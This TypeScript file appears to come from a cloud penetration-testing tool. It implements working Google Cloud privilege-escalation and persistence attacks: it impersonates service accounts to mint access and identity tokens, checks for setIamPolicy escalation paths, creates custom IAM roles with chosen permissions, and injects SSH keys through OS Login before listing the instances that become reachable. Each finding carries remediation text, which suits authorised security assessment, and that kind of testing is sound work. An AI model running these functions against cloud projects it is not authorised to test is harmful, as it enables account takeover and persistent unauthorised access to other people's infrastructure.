import { gcloud, run, resolveProject, argVal, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function gcpPrivesc(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method")
  if (!method)
    return { output: "ERROR: --method required (impersonate|set_iam_policy|act_as|token_create)", findings: [] }
  const targetSa = argVal(args, "--target-sa")
  const project = await resolveProject(argVal(args, "--project"))
  const findings: Finding[] = []

  if (method === "impersonate") {
    if (!targetSa) return { output: "ERROR: --target-sa required for impersonate", findings }
    const r = await run(
      "gcloud",
      ["auth", "print-access-token", `--impersonate-service-account=${targetSa}`],
      timeout,
    )
    if (r.exitCode === 0) {
      findings.push({
        checkId: "GCP-PRIVESC-001",
        provider: "gcp",
        severity: "critical",
        status: "EXPLOITED",
        resource: targetSa,
        title: `SA impersonation successful: ${targetSa}`,
        details: `Access token obtained via impersonation`,
        remediation: "Remove iam.serviceAccounts.getAccessToken permission from the caller",
      })
      return {
        output: `[+] Impersonation successful for ${targetSa}\n    Token: ${r.stdout.trim().slice(0, 20)}...`,
        findings,
      }
    }
    return { output: `[-] Impersonation failed: ${r.stderr.trim()}`, findings }
  }

  if (method === "set_iam_policy") {
    const r = await gcloud(["projects", "get-iam-policy", project, "--format=json"], timeout)
    if (r.exitCode !== 0) return { output: `[-] Cannot read IAM policy: ${r.stderr.trim()}`, findings }
    const policy = tryJson(r.stdout)
    const bindings = policy?.bindings || []
    const ownerBindings = bindings.filter(
      (b: { role: string }) =>
        b.role === "roles/owner" || b.role === "roles/resourcemanager.projectIamAdmin",
    )
    if (ownerBindings.length > 0) {
      findings.push({
        checkId: "GCP-PRIVESC-002",
        provider: "gcp",
        severity: "critical",
        status: "POSSIBLE",
        resource: project,
        title: "setIamPolicy escalation path detected",
        details: `${ownerBindings.length} owner/admin binding(s) found`,
        remediation: "Restrict setIamPolicy permissions",
      })
    }
    return {
      output: `[*] Project: ${project}\n[*] IAM bindings: ${bindings.length}\n[*] Owner/Admin bindings: ${ownerBindings.length}\n${ownerBindings.length > 0 ? "[+] setIamPolicy escalation may be possible" : "[-] No direct escalation path via setIamPolicy"}`,
      findings,
    }
  }

  if (method === "act_as") {
    if (!targetSa) return { output: "ERROR: --target-sa required for act_as", findings }
    const r = await gcloud(
      ["iam", "service-accounts", "get-iam-policy", targetSa, "--project", project, "--format=json"],
      timeout,
    )
    if (r.exitCode === 0) {
      findings.push({
        checkId: "GCP-PRIVESC-003",
        provider: "gcp",
        severity: "high",
        status: "ENUMERATED",
        resource: targetSa,
        title: `SA IAM policy retrieved: ${targetSa}`,
        details: `actAs analysis for ${targetSa}`,
        remediation: "Review iam.serviceAccounts.actAs bindings",
      })
      return { output: `[+] IAM policy for ${targetSa}:\n${r.stdout}`, findings }
    }
    return { output: `[-] Cannot read SA policy: ${r.stderr.trim()}`, findings }
  }

  if (method === "token_create") {
    if (!targetSa) return { output: "ERROR: --target-sa required for token_create", findings }
    const r = await run(
      "gcloud",
      [
        "auth",
        "print-identity-token",
        `--impersonate-service-account=${targetSa}`,
        `--audiences=https://${targetSa}`,
      ],
      timeout,
    )
    if (r.exitCode === 0) {
      findings.push({
        checkId: "GCP-PRIVESC-004",
        provider: "gcp",
        severity: "critical",
        status: "EXPLOITED",
        resource: targetSa,
        title: `Identity token created: ${targetSa}`,
        details: `Identity token generated via impersonation`,
        remediation: "Revoke iam.serviceAccounts.getOpenIdToken permission",
      })
      return {
        output: `[+] Identity token created for ${targetSa}\n    Token: ${r.stdout.trim().slice(0, 30)}...`,
        findings,
      }
    }
    return { output: `[-] Token creation failed: ${r.stderr.trim()}`, findings }
  }

  return { output: `ERROR: Unknown method: ${method}`, findings: [] }
}

export async function customRoleAbuse(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const roleId = argVal(args, "--role-id")
  const permissions = argVal(args, "--permissions")
  const findings: Finding[] = []

  if (!roleId) return { output: "ERROR: --role-id required", findings }

  const output: string[] = [`[*] Custom role abuse — project: ${project}\n`]

  if (!permissions) {
    const existing = await gcloud(["iam", "roles", "list", "--project", project, "--format=json"], timeout)
    if (existing.exitCode === 0) {
      const roles = tryJson(existing.stdout) || []
      output.push(`[+] Existing custom roles: ${roles.length}`)
      for (const r of roles) {
        const name = r.name?.split("/").pop() || r.name
        output.push(`    ${name}: ${r.title} (${r.stage || "GA"})`)
      }
    }
    return { output: output.join("\n"), findings }
  }

  const permList = permissions.split(",").map((p: string) => p.trim())
  const create = await gcloud(
    [
      "iam",
      "roles",
      "create",
      roleId,
      "--project",
      project,
      "--title",
      `cs-${roleId}`,
      "--permissions",
      permList.join(","),
      "--stage",
      "GA",
      "--quiet",
    ],
    timeout,
  )

  if (create.exitCode === 0) {
    output.push(`[+] Custom role created: ${roleId}`)
    output.push(`    Permissions: ${permList.join(", ")}`)
    findings.push({
      checkId: "GCP-ROLE-001",
      provider: "gcp",
      severity: "critical",
      status: "CREATED",
      resource: `role/${roleId}`,
      title: `Custom role created: ${roleId}`,
      details: `Role with ${permList.length} permissions: ${permList.join(", ")}`,
      remediation: `Delete: gcloud iam roles delete ${roleId} --project ${project}`,
    })
  } else {
    output.push(`[-] Role creation failed: ${create.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

export async function osLoginAbuse(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const sshKeyFile = argVal(args, "--ssh-key-file")
  const findings: Finding[] = []
  const output: string[] = [`[*] OS Login abuse — project: ${project}\n`]

  const info = await gcloud(["compute", "project-info", "describe", "--project", project, "--format=json"], timeout)
  if (info.exitCode === 0) {
    const data = tryJson(info.stdout)
    const metadata = data?.commonInstanceMetadata?.items || []
    const osLoginEnabled = metadata.some(
      (m: { key: string; value: string }) => m.key === "enable-oslogin" && m.value === "TRUE",
    )
    output.push(`[*] OS Login enabled: ${osLoginEnabled ? "YES" : "NO"}`)

    if (!osLoginEnabled) {
      output.push(`[-] OS Login is not enabled — SSH key injection via OS Login will not work`)
      output.push(`[*] Alternative: inject SSH key via project metadata`)
      return { output: output.join("\n"), findings }
    }
  }

  if (sshKeyFile) {
    const keyContent = await Bun.file(sshKeyFile).text().catch(() => "")
    if (!keyContent) {
      output.push(`[-] Cannot read SSH key file: ${sshKeyFile}`)
      return { output: output.join("\n"), findings }
    }

    const add = await gcloud(
      ["compute", "os-login", "ssh-keys", "add", "--key-file", sshKeyFile, "--project", project],
      timeout,
    )
    if (add.exitCode === 0) {
      output.push(`[+] SSH key added via OS Login`)
      output.push(`    Key file: ${sshKeyFile}`)
      findings.push({
        checkId: "GCP-OSLOGIN-001",
        provider: "gcp",
        severity: "critical",
        status: "INJECTED",
        resource: project,
        title: "SSH key injected via OS Login",
        details: `SSH public key added to OS Login profile — grants SSH access to all instances with OS Login enabled`,
        remediation: "Remove key: gcloud compute os-login ssh-keys remove --key KEY_FINGERPRINT",
      })
    } else {
      output.push(`[-] Key injection failed: ${add.stderr.trim()}`)
    }
  }

  const profile = await gcloud(["compute", "os-login", "describe-profile", "--format=json"], timeout)
  if (profile.exitCode === 0) {
    const p = tryJson(profile.stdout)
    const sshKeys = p?.sshPublicKeys || {}
    const keyCount = Object.keys(sshKeys).length
    output.push(`\n[+] OS Login profile SSH keys: ${keyCount}`)
    for (const [fingerprint, key] of Object.entries(sshKeys) as [string, Record<string, string>][]) {
      output.push(`    ${fingerprint.substring(0, 16)}... exp=${key.expirationTimeUsec || "never"}`)
    }
    output.push(`    POSIX username: ${p?.posixAccounts?.[0]?.username || "unknown"}`)
  }

  const instances = await gcloud(["compute", "instances", "list", "--project", project, "--format=json"], timeout)
  if (instances.exitCode === 0) {
    const instList = tryJson(instances.stdout) || []
    const osLoginInstances = instList.filter((i: Record<string, unknown>) => {
      const meta = i.metadata as Record<string, unknown> | undefined
      const items = (meta?.items || []) as Array<{ key: string; value: string }>
      return items.some((m) => m.key === "enable-oslogin" && m.value !== "FALSE")
    })
    output.push(`\n[+] Instances accessible via OS Login: ${osLoginInstances.length}`)
    for (const i of osLoginInstances) {
      const ip = (i.networkInterfaces || [])[0]?.accessConfigs?.[0]?.natIP || "(internal only)"
      output.push(`    ${i.name} zone=${i.zone?.split("/").pop()} ip=${ip}`)
    }
  }

  return { output: output.join("\n"), findings }
}
